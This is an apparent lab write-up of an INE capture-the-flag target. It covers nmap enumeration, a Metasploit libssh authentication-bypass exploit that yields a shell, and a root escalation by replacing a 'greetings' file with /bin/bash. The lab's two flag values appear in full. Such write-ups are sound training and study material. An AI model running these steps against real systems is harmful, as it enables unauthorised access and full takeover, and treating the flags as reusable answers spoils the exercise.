# Target Info
*Domain*: `target2.ine.local`
*IP*:`192.63.116.4`

# flags
3) *flag3*: `5e962a94e5244efcad6fce770229fe51`
4) *flag4* : `c23a7d385a5843758dde5da03321caf4`
# Enumeration
## Service enumeration
```shell
- nmap -sS -sV -sC -A -T4 -oX target2 target2.ine.local
	
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-13 01:50 IST
	Nmap scan report for target2.ine.local (192.63.116.4)
	Host is up (0.000072s latency).
	Not shown: 999 closed tcp ports (reset)
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
	| ssh-hostkey: 
	|_  2048 31:e2:1d:f1:b2:39:0c:a3:ec:db:01:4a:eb:a2:39:c7 (RSA)
	MAC Address: 02:42:C0:3F:74:04 (Unknown)
	Device type: general purpose
	Running: Linux 4.X|5.X
	OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
	OS details: Linux 4.15 - 5.8
	Network Distance: 1 hop
```
# Exploitation
## exploiting ssh
```shell
msfconsole
# using libssh_auth_bypass exploit
search libssh_auth_bypass
use 0
set rhosts target2.ine.local
set spawn_pty true
run

[*] 192.63.116.4:22 - Attempting authentication bypass
[*] Attempting "Shell" Action, see "show actions" for more details
[*] Command shell session 4 opened (192.63.116.2:40991 -> 192.63.116.4:22) at 2025-05-13 01:54:43 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

# meterpreter session
- whoami
> user

# finding flag
find / -name 'flag.txt' 2>/dev/null
cat /home/user/flag.txt
> FLAG3_5e962a94e5244efcad6fce770229fe51
```

# Post-Exploitation
## Root Access
``` shell
rm -rf greetings
cp /bin/bash greetings
./welcome
# bnoom ! got root
cat /root/flag.txt
FLAG4_c23a7d385a5843758dde5da03321caf4
```